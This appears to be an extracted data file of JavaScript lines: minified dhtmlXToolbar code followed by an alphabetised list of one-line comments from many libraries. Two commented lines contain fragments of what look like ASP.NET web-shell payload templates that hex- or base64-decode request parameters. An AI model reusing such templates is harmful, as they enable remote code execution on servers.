dhxtoolbar_icons_""+this.conf.iconSize}}if(h==""dhx_terrace""){this._improveTerraceSkin()}};dhtmlXToolbarObject.prototype.setAlign=function(a){this.conf.align=(a==""right""?""right"":""left"");this.base.className=(a==""right""?""dhxtoolbar_float_right"":""dhxtoolbar_float_left"");if(this._spacer){this._spacer.className=(a==""right""?"" dhxtoolbar_float_left"":"" dhxtoolbar_float_right"")}};dhtmlXToolbarObject.prototype.setIconSize=function(a){this.conf.iconSize=({18:true,24:true,32:true,48:true}[a]?a:18);this.setSkin(this.conf.skin,true);this.callEvent(""_onIconSizeChange"",[this.conf.iconSize])};dhtmlXToolbarObject.prototype.setIconsPath=function(a){this.conf.icons_path=a};dhtmlXToolbarObject.prototype.setUserData=function(e,a,c){e=this.idPrefix+e;if(this.objPull[e]!=null){if(this.objPull[e].userData==null){this.objPull[e].userData={}}this.objPull[e].userData[a]=c}};dhtmlXToolbarObject.prototype.getUserData=function(c,a){c=this.idPrefix+c;if(this.objPull[c]!=null&&this.objPull[c].userData!=null){return this.objPull[c].userData[a]||null}return null};dhtmlXToolbarObject.prototype._isListOptionExists=function(a,e){if(this.objPull[this.idPrefix+a]==null){return false}var c=this.objPull[this.idPrefix+a];if(c.type!=""buttonSelect""){return false}if(c._listOptions[e]==null){return false}return true};dhtmlXToolbarObject.prototype.setListOptionUserData=function(a,h,c,g){if(!this._isListOptionExists(a,h)){return}var e=this.objPull[this.idPrefix+a]._listOptions[h];if(e.userData==null){e.userData={}}e.userData[c]=g};dhtmlXToolbarObject.prototype.getListOptionUserData=function(a,g,c){if(!this._isListOptionExists(a,g)){return null}var e=this.objPull[this.idPrefix+a]._listOptions[g];if(!e.userData){return null}return(e.userData[c]?e.userData[c]:null)};dhtmlXToolbarObject.prototype._improveTerraceSkin=function(){if(this.conf.terrace_radius==null){this.conf.terrace_radius=""3px""}var g=[];var h={separator:true,text:true};var m=[this.base];if(this._spacer!=null){m.push(this._spacer)}for(var o=0;o<m.length;o++){g[o]=[];for(var c=0;c<m[o].childNodes.length;c++){if(m[o].childNodes[c].idd!=null&&m[o].childNodes[c].style.display!=""none""){var n=this.idPrefix+m[o].childNodes[c].idd;if(this.objPull[n]!=null&&this.objPull[n].obj==m[o].childNodes[c]){g[o].push({a:n,type:this.objPull[n].type,node:this.objPull[n][this.objPull[n].type==""buttonSelect""?""arw"":""obj""]})}}}m[o]=null}for(var o=0;o<g.length;o++){for(var c=0;c<g[o].length;c++){var r=g[o][c];var s=false;var l=false;if(!h[r.type]){if(c==g[o].length-1||(g[o][c+1]!=null&&h[g[o][c+1].type])){s=true}if(c==0||(c-1>=0&&g[o][c-1]!=null&&h[g[o][c-1].type])){l=true}}r.node.style.borderRightWidth=(s?""1px"":""0px"");r.node.style.borderTopRightRadius=r.node.style.borderBottomRightRadius=(s?this.conf.terrace_radius:""0px"");if(r.type==""buttonSelect""){r.node.previousSibling.style.borderTopLeftRadius=r.node.previousSibling.style.borderBottomLeftRadius=(l?this.conf.terrace_radius:""0px"");r.node.previousSibling._br=s;r.node.previousSibling._bl=l}else{r.node.style.borderTopLeftRadius=r.node.style.borderBottomLeftRadius=(l?this.conf.terrace_radius:""0px"")}r.node._br=s;r.node._bl=l}}for(var o=0;o<g.length;o++){for(var c=0;c<g[o].length;c++){for(var n in g[o][c]){g[o][c][n]=null}g[o][c]=null}g[o]=null}g=m=null};dhtmlXToolbarObject.prototype._improveTerraceButtonSelect=function(e,c){var a=this.objPull[e];if(c==true){a.obj.style.borderBottomLeftRadius=(a.obj._bl?this.conf.terrace_radius:""0px"");a.arw.style.borderBottomRightRadius=(a.obj._br?this.conf.terrace_radius:""0px"")}else{a.obj.style.borderBottomLeftRadius=""0px"";a.arw.style.borderBottomRightRadius=""0px""}a=null};if(typeof(window.dhtmlXCellObject)!=""undefined""){dhtmlXCellObject.prototype._createNode_toolbar=function(h,c,g,a,e){if(typeof(e)!=""undefined""){h=e}else{h=document.createElement(""DIV"");h.className=""dhx_cell_toolbar_""+(this.conf.borders?""def"":""no_borders"");h.appendChild(document.createElement(""DIV""));h.firstChild.className=""dhx_toolbar_base_18_dhx_skyblue""}this.cell.insertBefore(h,this.cell.childNodes[this.conf.idx.cont]);this.conf.ofs_nodes.t.toolbar=true;this._updateIdx();return h};dhtmlXCellObject.prototype.attachToolbar=function(a){if(!(this.dataNodes.ribbon==null&&this.dataNodes.toolbar==null)){return}this.callEvent(""_onBeforeContentAttach"",[""toolbar""]);if(typeof(a)==""undefined""){a={}}else{if(typeof(a)==""string""){a={skin:a}}}if(typeof(a.skin)==""undefined""){a.skin=this.conf.skin}a.parent=this._attachObject(""toolbar"").firstChild;this.dataNodes.toolbar=new dhtmlXToolbarObject(a);this._adjustCont(this._idd);this.dataNodes.toolbar._masterCell=this;this.dataNodes.toolbar.attachEvent(""_onIconSizeChange"",function(){this._masterCell._adjustCont()});a.parent=null;a=null;this.callEvent(""_onContentAttach"",[]);return this.dataNodes.toolbar};dhtmlXCellObject.prototype.detachToolbar=function(){if(!this.dataNodes.toolbar){return}this.dataNodes.toolbar._masterCell=null;this.dataNodes.toolbar.unload();this.dataNodes.toolbar=null;delete this.dataNodes.toolbar;this._detachObject(""toolbar"")};dhtmlXCellObject.prototype.showToolbar=function(){this._mtbShowHide(""toolbar"","""")};dhtmlXCellObject.prototype.hideToolbar=function(){this._mtbShowHide(""toolbar"",""none"")};dhtmlXCellObject.prototype.getAttachedToolbar=function(){return this.dataNodes.toolbar}}"
"// function is fired after onload, e.g. when script is inserted dynamically "
"// function is not evaluated in the context of AsyncSquaringLibrary, and is"
"// function that parses unary prefix operators is called first, and"
"// function types, so we can provide a better error message"
"// function(response) { },"
"// function, like setProps, setState, forceUpdate, etc.; creation and"
"// function, or in the while loop, then stop flowing."
"// functions to specify precedence, for all of the ten binary"
"// future (1 hour + maximum timezone offset which is 27 hours),"
"// g. If pattern is true, then"
"// g. Otherwise,"
"// g. THROW ""not found"""
"// generated positions relative to the start of the section, so we"
"// generates messages like ""No results"""
"// get `typeof []`, not `typeof[]`"
"// get fixed independently and released in different versions of Chrome,"
"// get the extension (""ext"" or "".ext"" or full path)"
"// get the requested proxy ""protocol"""
"// get the socket, path"
"// getAllResponseHeaders sometimes falsely returns """" for CORS requests, but"
"// getRandomValues needs to be invoked in a context where ""this"" is a Crypto"
"// getter, returns `bar`"
"// given a set of versions and a range, create a ""simplified"" range"
"// global on the server, window in the browser"
"// global_bookmarks[gb] ,"
"// go ahead and clear error, so we can write again."
"// go through the array every three bytes, we'll deal with trailing stuff later"
"// going forward, all requests with a Content-type of"
"// good Non-Final letter. Words like 'Pop', 'Winamp' and 'Mubarak' for"
"// got an ""options"" object"
"// greater than U+00FF."""
"// grid.attachEvent(""onValidationError"", (rid,index,value,rule)=>{"
"// grid_host.attachEvent(""onDataReady"",function(){"
"// grid_host.load(this.getPath('test.json'), null, 'json');"
"// gzip - bigger header, same deflate compression"
"// h. Otherwise,"
"// had an encoding set, or a buffer otherwise."
"// handle missing properties, etc."
"// handle the ""file not found"" error code"
"// handle your error appropriately here, e.g.:"
"// handler in flow(), but adding and removing repeatedly is"
"// hang on to this Response object for the ""redirects"" Array"
"// happen. Likewise for ""asdf""in obj. See #170."
"// happened to determine the amount of ""wasted work"" performed."
"// happens if "";;"" appears"
"// happens with a non-symlink entry, it'll just fail to unpack,"
"// happens, re-invoke the method against context.visitor."
"// has returned yet), so that we know whether or not it's safe to emit"
"// has stored a reference to `this`, and the previous owner (if different)"
"// has to reindent a line, or you pass false for this option."
"// have dashes, we need to also store a copy of that"
"// have exhausted all components, so the path is not relative to the root."
"// have here is a dangling comment, e.g. [/* crickets */]."
"// have much to do anymore. Still, it might prove useful in the future."
"// have to do it in a separate transaction, else the correct"
"// header ""data"" events onto the socket once the HTTP machinery is"
"// header content is a string, and distinction between 0 and no information is crucial"
"// height during animation, can be set to 'auto', 'initial', 'next' or pixel amount"
"// here, because this code is executed while defining those types."
"// here.  For example, imagine a stream where every byte of input is"
"// high surrogate, and there is a next character"
"// high-resolution, monotonically non-decreasing timestamps relative to startTime."
"// however, don't suppress the throwing behavior for this."
"// however, if we've ended, then there's no point, and if we're already"
"// http://jmrware.com/articles/2009/uri_regexp/URI_regex.html + optional protocol + required ""."""
"// http://www.whatwg.org/specs/web-apps/current-work/multipage/ HTML5, of course"
"// https if specified, fallback to http in any other case"
"// https://html.spec.whatwg.org/multipage/webappapis.html#event-handlers-on-elements,-document-objects,-and-window-objects"
"// i=0;i<Z.Length;i+=2){B[i/2]=byte(Convert.ToInt32(Z.Substring(i,2),16));}var"
"// iOS 8/Yosemite, doesn't properly support IndexedDB)."
"// id&&lang, icon, disabled"
"// id, class, pseudo-class selector"
"// identical logic, which this produces."
"// identifier, then it can't be an arrow function modifier, and we"
"// identifiers, so '\' also dispatches to that."
"// ie, `has-tostringtag/shams"
"// if ( typeof module === ""object"" && typeof module.exports === ""object"" ) {"
"// if (!HAS_MILLIS_RES) return fs.utimes(path, atime, mtime, callback)"
"// if (oedtype === ""decoder"" && nValue != ""php"" && nValue != ""custom"") {"
"// if ANY of the sets match ALL of its comparators, then pass"
"// if `myFunction` takes < 1000 ms to execute, `err`"
"// if a FormData instance got created, then we send that as the request body"
"// if a `cache` was provided, check if the file has not been modified"
"// if a string, just return it"
"// if an error happens while we don't use the socket anyway, meh, throw the socket away"
"// if any comparators are the null set, then replace with JUST null set"
"// if any of the file processing produced an error, err would equal that error"
"// if any of the saves produced an error, err would equal that error"
"// if anyone needs a drain, then we have to wait for that."
"// if didn't throw, then means error was handled."
"// if dirs are readable, then they should be listable"
"// if either fails, handle the first error"
"// if entities weren't decoded, no need to encode them back"
"// if err is non-null, we got an error"
"// if err is non-null, we got an error. otherwise, value is the value "
"// if every destination was unpiped, either before entering this"
"// if force is false, this behaves like remove"
"// if force is true, this behaves like add"
"// if force is undefined, this behaves as one would expect toggle to"
"// if four, top, right, bottom, left"
"// if futimes fails, try utimes"
"// if getAttribute returns null, there is no href"
"// if given the method property in options, set property explicitMethod to true"
"// if it already exists, then call the shorthandGetter, if it's an empty"
"// if it extends another schema, it must pass that schema as well"
"// if it is first byte, we also get byte length"
"// if it starts with single or double quotes, does it end with the same?"
"// if it's past the high water mark, we can push in some more."
"// if last byte in current buffer is not the last byte of a character, we need to know how many bytes to skip in next buffer"
"// if last one is own, then all properties are own."
"// if lchmod/lchown do not exist, then make them no-ops"
"// if more than one comparator, remove any * comparators"
"// if new RegExp(""\\\n') is provided, create /\n/"
"// if next is called with a value in its first parameter, it will appear"
"// if no 'id' is defined for the object element, it will inherit the 'id' from the alternative content"
"// if no error to emit, still reject pending promises"
"// if none of that works, return null"
"// if not the same, we are in the **old** (cancelled) request,"
"// if oldPreviousSibling is non-null, and to oldParent otherwise."
"// if one, it applies to all"
"// if one, it applies to both horizontal and verical spacing"
"// if our boundary turned out to be rubbish, the captured lookbehind"
"// if port is 80, then we can remove the port so that the"
"// if read() returns EAGAIN, then just try it again."
"// if the dest has an error, then stop piping into it."
"// if the environment has native Symbol support. Not polyfillable, not forgeable."
"// if the length is currently zero, then we *need* a readable event."
"// if the newChild is already in the tree elsewhere, remove it first"
"// if the path is allowed to go above the root, restore leading ..s"
"// if the path tries to go above the root, `up` ends up > 0"
"// if the stat fails, then that's super weird."
"// if the subset has a prerelease, we need a comparator in the superset"
"// if there are no more bytes in this buffer, just emit our char"
"// if there was a < or >, and nothing in the dom, then must be false"
"// if there was some whitespace, then add that in."
"// if there were data event listeners added, then switch to old mode."
"// if there's any attributes with an undefined namespace,"
"// if there's any overlap between mask and mode,"
"// if there's no media query at all (the () part), or min or max is not null, and if either is present, they're true"
"// if there's nothing in the write buffer, then that means"
"// if there's something in the buffer waiting, then process it"
"// if this turns out to be a performance issue, maybe add:"
"// if three, the first applies to the top, the second to left and right, the third bottom"
"// if true, Karma captures browsers, runs the tests and exits"
"// if true, a maybeReadMore has been scheduled"
"// if two, the first applies to the horizontal and the second applies to vertical spacing"
"// if two, the first applies to the top and bottom, and the second to left and right"
"// if utimes fails, fail with the original error"
"// if we allow half-open state, or if the writable side ended,"
"// if we are not creating a directory, and the path is in the dirCache,"
"// if we are sync, wait until next tick to emit the data."
"// if we can't do this job yet, push it to the end of the queue"
"// if we currently have less than the highWaterMark, then also read some"
"// if we did not instantiate with a proxy, set one per request"
"// if we didn't call the onwrite immediately, then"
"// if we didn't get a 2xx ""success"" status code, then create an Error object"
"// if we didn't receive any character in our consideration range, return negative answer"
"// if we don't throw, reset it back how it was"
"// if we fail to access Google DNS (as in firewall blocks access),"
"// if we finished, then the entry is reset"
"// if we guessed wrong, and it's not a directory, then"
"// if we have 1 byte left, pad 2 bytes"
"// if we have any that are *, then the range is just *"
"// if we have any that are not the null set, throw out null sets."
"// if we have extended or global extended headers, apply them now"
"// if we have no queue, then that means a clogged READENTRY"
"// if we haven't written anything, then go ahead and emit,"
"// if we increase `i` as we go, then subtract off its starting"
"// if we need a readable event, then we need to do some reading."
"// if we only have a smaller bit left to read, alloc a smaller buffer"
"// if we somehow ended up with a path that escapes the cwd, and we are"
"// if we want the data now, just emit it."
"// if we're already writing something, then just put this"
"// if we're doing read(0) to trigger a readable event, but we"
"// if we're including prereleases in the match, then we need"
"// if we're missing parts, add them."
"// if we're not piping anywhere, then do nothing."
"// if we've ended and we have some data left, then emit"
"// if we've ended, and we're now clear, then finish it up."
"// if y is 1/x mod m, then y(2-xy) is 1/x mod m^2"
"// if you wish to use ""request"" instead please"
"// if((this.grid._tgc.iconTree==null)||(this.grid._tgc.iconTree!=this.grid.iconTree)){var h={};h.spacer=""<img src='""+this.grid.iconTree+""blank.gif'  align='top' class='space'>"";h.imst=""<img style='margin-top:-2px;' src='""+this.grid.iconTree;h.imsti=""<img style='padding-top:2px;'  src='""+(this.grid.iconURL||this.grid.iconTree);h.imact=""' align='top' onclick='this.""+(_isKHTML?"""":""parentNode."")+""parentNode.parentNode.parentNode.parentNode.grid.doExpand(this);event.cancelBubble=true;'>"";h.plus=h.imst+""plus.gif""+h.imact;h.minus=h.imst+""minus.gif""+h.imact;h.blank=h.imst+""blank.gif""+h.imact;h.start=""<div class='treegrid_cell' style='overflow:hidden; white-space : nowrap; line-height:23px; height:""+(_isIE?21:23)+""px;'>"";h.itemim=""' align='top' ""+(this.grid._img_height?(' height=""'+this.grid._img_height+'""'):"""")+(this.grid._img_width?(' width=""'+this.grid._img_width+'""'):"""")+"" ><span id='nodeval'>"";h.close=""</span></div>"";this.grid._tgc=h}"
"// if(err || !f) return ;   console.debug(f);   let farr = f.split(""#"");"
"// ignore the value of ""this"" that the user is trying to use, so"
"// ignoring the error from close(2) is a bad practice, but at"
"// immediately, or on a later tick.  We set this to true at first, because"
"// implementation in Store will immediately call the callback with a ""not"
"// implementation. Also, find the complete implementation of crypto on IE11."
"// implementation; it's our preferred backend library. We use ""_spec_test"""
"// implemented"" Error."
"// import ""foo"";"
"// import defaultObj, { x, y as z } from '...'"
"// import foo, * as foo"
"// import foo, ..."
"// import foo, {bar}"
"// import { ... } from ""..."";"
"// in ':not()' pseudo-classes, breaks some test units"
"// in Node.js, io.js, or RingoJS v0.8.0+"
"// in a browserify environment, this isn't present"
"// in an array, similar to Angular.js dependency injection."
"// in browserify, the require will succeed but return an empty object"
"// in case subprop is an implicit property, this will clear"
"// in case the value is something like 'none' that removes all values,"
"// in comma separated group (p, p)"
"// in flow(), but that is too slow."
"// in here as 'err', and execution will stop."
"// in hopes that this is preserved even if ""\uFEFF"" is transformed to"
"// in loose mode, but will still throw if the WHOLE range is invalid."
"// in loose mode, throw out any that are not valid comparators"
"// in non-xmlns mode, we can emit the event right away"
"// in older engines, regexes are callable"
"// in ondata again. However, we only want to increase awaitDrain once because"
"// in preserve owner mode, chown if the entry doesn't match process"
"// in set owner mode, chown if setting doesn't match process"
"// in strict mode, this may be null / undefined"
"// in that case, element will be second argument"
"// in the queue, and wait our turn.  Otherwise, call _write"
"// in the same tick, so changing this is semver major."
"// in this case, we don't have to wait for the stat"
"// in turn another _read(n) call, in which case reading = true if"
"// include every environment we run tests in), so the test framework"
"// inclusive, starts with 0"
"// incomplete multi-byte UTF-8 character. The total number of bytes (2, 3, or 4)"
"// inconsistent, because we do `INSERT OR REPLACE INTO` on `setItem()`, so"
"// incrementing `n` each time, so we'll fix that now:"
"// indentation. If you do not pass this option explicitly, it will be"
"// infinite loop, because it iterates over the newly added props too."
"// inheriting them from Function.prototype, so that a malicious or clumsy"
"// initialized. Since we know we're in Chrome, we'll just detect this case"
"// input ends with one or two U+003D EQUALS SIGN (=) characters, remove"
"// insert b after a, it now has the same parent as a"
"// inserted into previously-existing DOM structures, they will be removed"
"// instance. Since we want to make it a no-op instead, we mirror the same"
"// instanceof Writable, they're instanceof Readable."
"// instead, so that the proxy doesn't get the HTTP request"
"// intended weirdness in node-sax, see https://github.com/isaacs/sax-js/issues/165"
"// intended. For example, <b><div></div></b> is invalid but we don't warn"
"// internally, and returns false if there's a lot of pending writes"
"// interpolation, evaluation or escaping regex, we need one that is"
"// interpreted as an integer from 0-255, and then results in that many"
"// into the document. Do so, thus queuing up the task. Remember to clean up once it's been called."
"// invalidation, since you can just reset path.__childCache to null."
"// invariant for a missing parent, which is super confusing."
"// ipv4, ipv6, domain?"
"// ipv4, ipv6, hostname"
"// ipv4, ipv6, hostname. Hostnames work with v4a and v5."
"// ipv4, ipv6, or hostname"
"// ironic, given the bug below!"
"// is `undefined`, we pass that value to the callback function."
"// is a %x2F (""/"") character."""
"// is a Node object, path.parentPath.node is distinct from"
"// is allowed. However, `let [` is an explicit negative lookahead for"
"// is an assignment (i.e., bindingType is BIND_NONE)."
"// is at very low usage worldwide, so we do a hacky userAgent check instead."
"// is augmented with `XRegExp.prototype` methods, and has a fresh `lastIndex` property (set to"
"// is blocked, and we never proceed."
"// is complete, but since a character will not make much difference, by simply skipping"
"// is false, because then we only care about this.isSupertypeOf(vDef)."
"// is none other than the partially-built object itself, and any"
"// is not a subtype of the Expression type, so we cannot safely"
"// is properly populated first, breaking out of our lazy approach for just"
"// is rewritten to crash the process before it finished (after 5000 bytes), to ensure data was not lost"
"// is somewhat obscure, because it works in character codes rather"
"// is true (hostname match, domain not specified)."
"// is unreliable, then we don't want to add node to the resultArray."
"// is unsupported, so let's not set it"
"// isValid(){1,4} | inherit"
"// it actually DOES have a body, we weren't going to do anything with"
"// it again, this node must be the closest following node we"
"// it always points at the current tag,"
"// it anyway, and it'll just be a warning about an invalid header."
"// it as the trailing edge, or we've hit the `maxWait` limit."
"// it is used for frequency analysis only, and we are validing"
"// it may be worth doing the same, but with a warning."
"// it modifies, so that `> 1.2.3` ==> `>1.2.3`"
"// it must return a false boolean in ""status"""
"// it to Base64, so this is how we store it to prevent very strange errors with less"
"// it to the next write(), which is a mem copy, but a small one."
"// it's been long enough since the last retry, do it again"
"// it's been more than 60 seconds total, bail now"
"// it's either shortcut (item, cb)"
"// it's just a reference to a mutable FastPath object, so we have"
"// item in an array, or -1 if the item is not included in the array."
"// item, and the tail is the oldest.  the list contains the Hit"
"// itemProp, itemScope, itemType are for"
"// iteration should follow the order of assignment, which happens to match"
"// itself, in such a way that == does not detect, is a"
"// itself, then it doesn't need parentheses. Only Node objects (in"
"// itself, we can strip that much whitespace from the left margin"
"// just a temporary solution, actually it may be wrong by just split the value with ',', because a url can include ','."
"// just return null, because there's no way to know from localStorage"
"// keep the first one, in case they're all null sets"
"// keepScripts (optional): If true, will include scripts passed in the html string"
"// key === 0, 1, 2"
"// key, when multiple keydown events are fired but only one keyup is."
"// keyup, but we check on keydown as well in the case of holding down a"
"// kinda lame to define this twice, but it seems require() isn't available here"
"// know of a better way to do this, given windows' non-atomic unlink"
"// known past behavior. When/if this matters, use `semver`."
"// large string into write() might have undesirable effects, but this is manageable by"
"// layer.confirm(LANG['confirm']['content'], {"
"// lchmod, broken prior to 0.6.2"
"// leading edge, instead of the trailing."
"// least, not without wrapping it in parentheses. Thus, it uses the"
"// length quantities we use in the source map spec, the first bit is the sign,"
"// length that character, and sets this.charReceived to the number of bytes"
"// let's also log events, because debugging some weird thing"
"// library in Gaia, we don't modify return values at all. If a key's value"
"// library-defined, default drivers."
"// lightweight FastPath [..., name, value] stacks."
"// like .pipe() but using super, because our write() is special"
"// like 5, but with data, which should be skipped"
"// like SourceLocation, but that seems harmless (TODO?)."
"// like full, but allows v1.2.3 and =1.2.3, which people do sometimes."
"// like, `!cond`"
"// line"""
"// lines. You can adjust the limit by changing this option; however,"
"// links, and removes symlink directories rather than erroring"
"// list of whitespace-separated values, see section 6.4 Class selectors"
"// list('/foo', function() {})"
"// list(true, function() {})"
"// listener (e.g., onClick={null})"
"// loaded, so there is no performance impact."
"// loading, and on load failure, and would allow access to _cssStyleSheet instead of the public .sheet API."
"// localforage is based, ALSO returns `null`. BLARG! So for now, we"
"// log error but continue execution, don't throw real exceptions"
"// logic, we can not catch common errors early. Therefore, we have to"
"// logs ""Hello, <b>world</b>!"" to the console"
"// logs `foo\n` 5 times, and then `ok`"
"// long enough, so go ahead and retry this item now"
"// loop is non-trivial. Basically, we have to parse the init `var`"
"// lower node than `document`), binding at `document` would cause duplicate"
"// lutimes implementation, or no-op"
"// m1 is flowing, so it writes the data to m2 immediately"
"// m2 is flowing, so it writes the data to m3 immediately"
"// m2's write returned true, so m1 is still flowing, returns true"
"// m3 is flowing, so it writes the data to m4 immediately"
"// m3's write returned true, so m2 is still flowing, returns true"
"// m4 is flowing, so it fires the 'data' event immediately, returns true"
"// m4's write returned true, so m3 is still flowing, returns true"
"// main Hebrew alphabet, all four map the same values to all 27 Hebrew letters"
"// main export, just make me a transform stream!"
"// maintains `context` and `exprAllowed`, and skips the space after"
"// make me a reusable prototype that I can `new`, or implicitly `new`"
"// malformed css, just return"
"// manager.retimeFile(id, this.rowsAr[id]['cells'][2].innerText);"
"// mappings are contiguous (i.e. given two consecutive mappings, the"
"// mappings are sorted, this is guaranteed to find all mappings for"
"// mark that we need a transform, so that any data that comes in"
"// may call the _write() callback in the same tick, so that we don't"
"// metadata only, skip"
"// method not invoked, lets run an animation"
"// method to call for nodes of that type, so the dispatch takes"
"// method) before the visitor method returns, or return false to"
"// methods before calling the new property, merging if appropriate."
"// missing in aNames but present in bNames, or vice-versa."
"// mistake so we'll warn you to use the static property, property"
"// mode, but otherwise continue on."
"// mode, the set of reserved words, support for getters and"
"// modifier keys exposed by the event itself, does not support Lock-keys."
"// module that supports a .parse function, pass that module object to"
"// more bandwidth, but is more compatible with older FTP servers"
"// more bytes.  This is to work around cases where hwm=0,"
"// more data continuously, but without triggering a nextTick"
"// more letters, digits, or hyphens."
"// more storage on Safari, this error will"
"// mostly just for testing, but useful in some cases."
"// must be no slashes, empty elements, or device names (c:\) in the array"
"// names is very small, and indexOf is a native Array method."
"// names to indices into the sources and names ArraySets), we have to make"
"// native handle. Our no-op handler prevented actual closure, but we"
"// naturally also ""visual"" and from left to right."
"// navigator.mimeTypes[""application/x-shockwave-flash""].enabledPlugin indicates whether plug-ins are enabled or disabled in Safari 3+"
"// necessarily symmetric or synchronous transformation.  For example,"
"// need to create a SHA1 hash of the URI string, for cacheability checks"
"// need to remove components from the root one by one, until either we find"
"// needReadable was set, then we ought to push more, so that another"
"// needs to have non-empty ""cookie-name"""
"// negatives in unlikely scenarios. For example, `[\u{61}-b]` is a"
"// never call cb(), then you'll never get another chunk."
"// new BigInteger(int,RNG)"
"// new BigInteger(int,int,RNG)"
"// new, unknown types can be dangerous"
"// newDoc is the newly inserted document, including its _id"
"// newDocs is an array with these documents, augmented with their _id"
"// next is suitable for passing to things that need a callback(err [, whatever]);"
"// next, check constructor"
"// next, check message"
"// no dependencies, use the function as-is"
"// no version specified, default to 5h"
"// node may be replaced with null,"
"// node program.js --s=""$VALUE"""
"// node v6.8.0 now supports a `timeout` value in `http.request()`, but we"
"// node, and `inst` is the deepest ancestor that does."
"// node.loc.start.column so that, when/if we print the comment by"
"// nodeType defaults to 9, since context defaults to document"
"// nodes when processing innerHTML, innerHTML on updated nodes suffers"
"// non-Chrome browsers, to check whether a string is in a set, a"
"// non-DIGIT character, ignore the cookie-av."""
"// non-fatal errors, keep this option true."
"// non-getter, non-setter method"
"// non-interactive elements, which means delegated click listeners do not"
"// nor polyfill, then a plain number is used for performance."
"// normalize the selector string, remove [\n\r\f]"
"// not a dir entry, have to remove it"
"// not a dir, and not reusable"
"// not a dir, and not reusable."
"// not an actual buffer we keep track of, but a measurement"
"// not clear what practical benefit doing so provides); instead, we warn only"
"// not enabled, or of a type that does not accept the focus."" for all kinds of"
"// not in preservePaths mode, then something is fishy!  This should have"
"// not quite valid, but good enough for JS"
"// not strict mode, assigning to eval"
"// not strict mode, using arguments"
"// not strict mode, using eval"
"// not strict mode, using eval, IsSimpleParameterList is false"
"// not strict mode, using eval, IsSimpleParameterList is true"
"// not strict mode, using octals"
"// not sure if fs.writeFileSync returns anything, but just in case"
"// not without wrapping it in parentheses. Thus, it uses the noCalls"
"// notch on the scroll is always +/- 120, roughly equivalent to pixels."
"// note that it excludes \x3B "";"""
"// note: parseFloat(' ') -> NaN, unlike +' ' -> 0."
"// note: unlike DOM, preceding / following is not set here"
"// note: we intentionally leave the stream paused,"
"// nothing in the list, definitely empty."
"// nothing, but don't throw an error"
"// now make it start, just in case it hadn't already."
"// now myDoubledList contains ['barbar', 2, 4, 6, 'foofoo']"
"// now that we have the `name`, check if any entries match in the `names` array"
"// now we have the stat, we can filter it."
"// now, make the key"
"// null can be used as wildcard). Returns a {node, state} object, or"
"// null means ""all paths"""
"// null out the rest of the buffer, if we could fit the block padding"
"// null)], but null values don't really make sense at the call site."
"// numReplaced = 1, upsert = { _id: 'id5', planet: 'Pluton', inhabited: false }"
"// number of bytes available, we need to check if we end on a leading/high"
"// number of pixels an element is allowed to be ""offstage"" for a position to be chosen (allows for rounding)"
"// number, or float."
"// numerical index order, but we don't rely on that."
"// nwmatcher gets `document.documentElement` at creation-time, so we have to initialize lazily, since in the initial"
"// object === {0:1,1:2,2:3}"
"// object exists, in that case we assume we're in CommonJS"
"// occur and can mess up types like Map<string, Array<string>>"
"// octals and adds the `xregexp` property, for simplicity"
"// of UnaryExpression, but they're not really Expression nodes."
"// of constructs (for example, the fact that `!x[1]` means `!(x[1])`"
"// of course pop() and shift() are there, too"
"// of definitions appropriate for a given parser, but until then we must"
"// of the error message, and then raises a `SyntaxError` with that"
"// of the response doesn't represent the piped content, so don't pass it."
"// of unit tests, since interface conformance is checked whenever new"
"// offset starts at 0x10000, and each pair of numbers represents an"
"// offset to the next range, and then a size of the range. They were"
"// old QtWebKit versions, at least)."
"// old, not part of spec anymore"
"// omitted by default: ""frame"""
"// omitted by default: ""frame"", ""iframe"""
"// on Windows, A/V software can lock the directory, causing this"
"// on itself (in other words, not on a prototype)."
"// on the current database operations. Thus, the driver will be actually"
"// on the next readable event, start it over again."
"// on unix, \ is a valid character in filenames."
"// on windows, either \ or / are valid directory separators."
"// once partition is done, the pivot is in the exact place it will be when"
"// once there is some data and the directory exists,"
"// one allocated and free to use, and we maintain at most two"
"// one, we ""replace"" the validated continuation bytes we've seen so far with"
"// only CommonJS-like environments that support module.exports,"
"// only add lines marked with "">"": 2, 3."
"// only could be private fields in 'in', such as #x in obj"
"// only fields for which ""readOnly"" applies"
"// only fields for which ""required"" applies"
"// only radio buttons, check boxes and option elements"
"// only remotes with semvers, ignore local files conataining a '/'"
"// onvert.FromBase64String(Request.Item[""${arg1}""].substr(#randomPrefix#)));var"
"// opened a tag.  node has ""name"" and ""attributes"""
"// opening parenthesis happens to precede the node.  For example,"
"// operator precedence, because it is much more compact than using"
"// operator, and will refer to its precedence."
"// opsPerSecond corresponds to 1 insert + 1 remove, needed to keep collection size at 10,000"
"// optional arguments, we eagerly look for a semicolon or the"
"// optional: { encoding, objectMode }"
"// options can be passed, e.g. {allErrors: true}"
"// or ""arguments"" and duplicate parameters."
"// or Buffer.alloc, and Buffer in node 10 deprecated the ctor."
"// or a fingerprinting algorithm, both solutions too complicated and slow given that live nedb"
"// or beginning with the identifier C immediately followed by ""-""."
"// or if we do, put Buffer.concat() back before we emit error"
"// or it can get credentials from process.env.AWS_ACCESS_KEY_ID, etc"
"// or long format (item, key, cb)"
"// or missing (e.g., for <datalist>), we don't change props.selected"
"// or on a later tick.  We set this to true at first, because any"
"// or on a later tick.  We set this to true at first, becuase any"
"// or try `name` from formidable, browser"
"// or try `path` from fs-, request- streams"
"// or undefined, passing each field name and effective value (as returned"
"// organize params for patch, post, put, head, del"
"// original length, plus the receiver, minus any additional arguments (after the receiver)"
"// originalEvent.stopPropagation method, so, consequently it would be a noop."
"// other binary types) aren't stored correctly, because when you fetch"
"// other context where localStorage isn't available, we don't use"
"// otherwise we assume that it's the destination endpoint,"
"// otherwise, keep it the same length it was before."
"// otherwise, return it."
"// our activeElementValue variable, allowing us to ignore those changes"
"// out of range, use replacement character"
"// output: ""<html><head></head><body>hello world</body></html>"""
"// outputted bit calls the readcb, and subsequent chunks just go into"
"// over the old one, deleting the new file."
"// overwrite it, rather than unlinking and recreating"
"// p1 sees p2's 'drain', calls resume(), emits 'resume' and 'drain' on next"
"// p2 returns false and buffers, pausing p1, then writes to p3 on next tick (2)"
"// p2 sees p3's 'drain', calls resume(), emits 'resume' and 'drain' on next tick (6)"
"// p3 returns false and buffers, pausing p2, then writes to p4 on next tick (3)"
"// p3 sees p4's 'drain' event, and calls resume(), emitting 'resume' and"
"// p4 returns false and buffers, pausing p3, then emits 'data' and 'drain'"
"// pad the end with zeros, but make sure to not forget the extra bytes"
"// pad with nulls, return true if it's longer or non-ascii"
"// pairs, or two parallel arrays of the same length -- one of keys, and one of"
